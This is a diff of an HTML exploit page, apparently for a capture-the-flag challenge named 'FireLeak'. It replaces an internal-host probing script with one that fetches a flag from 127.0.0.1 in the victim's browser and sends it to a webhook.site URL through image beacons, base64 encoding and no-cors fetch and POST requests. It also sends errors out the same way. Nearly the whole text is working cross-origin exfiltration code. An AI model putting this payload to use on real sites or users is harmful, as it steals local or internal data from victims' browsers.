@@ -1,36 +1,38 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
+<head><title>Exploit</title></head>
 <body>
-<h1>FireLeak host probe</h1>
-
 <script>
-const endpoint = "https://webhook.site/5dc1560a-274c-4539-af81-568512041310";
+// Try multiple exfiltration methods
+fetch('http://127.0.0.1/flag')
+  .then(r => r.text())
+  .then(flag => {
+    // Method 1: Image - usually works even with CORS
+    const img1 = new Image();
+    img1.src = 'https://webhook.site/5dc1560a-274c-4539-af81-568512041310?flag=' + encodeURIComponent(flag);
 
-const hosts = [
-  "http://127.0.0.1",
-  "http://localhost",
-  "http://fireleak",
-  "http://app",
-  "http://web",
-];
+    // Method 2: Image with base64
+    const img2 = new Image();
+    img2.src = 'https://webhook.site/5dc1560a-274c-4539-af81-568512041310?b64=' + btoa(flag);
 
-function log(host, ev) {
-  fetch(`${endpoint}?kind=hostscan&host=${encodeURIComponent(host)}&event=${ev}`).catch(() => {});
-}
+    // Method 3: Try fetch with no-cors
+    fetch('https://webhook.site/5dc1560a-274c-4539-af81-568512041310', {
+      method: 'POST',
+      mode: 'no-cors',
+      body: flag
+    });
 
-function probeHost(base) {
-  const ifr = document.createElement("iframe");
-  ifr.onload = () => log(base, "load");
-  ifr.onerror = () => log(base, "error");
-  ifr.src = base + "/?cb=" + Math.random();
-  document.body.appendChild(ifr);
-}
-
-hosts.forEach(probeHost);
+    // Method 4: Fetch as GET parameter
+    fetch('https://webhook.site/5dc1560a-274c-4539-af81-568512041310?data=' + btoa(flag), {
+      mode: 'no-cors'
+    });
+  })
+  .catch(e => {
+    // Send error via image
+    const errImg = new Image();
+    errImg.src = 'https://webhook.site/5dc1560a-274c-4539-af81-568512041310?error=' + encodeURIComponent(e.message);
+  });
 </script>
-
 </body>
 </html>
-
-
 <!--const endpoint = "https://webhook.site/5dc1560a-274c-4539-af81-568512041310";-->
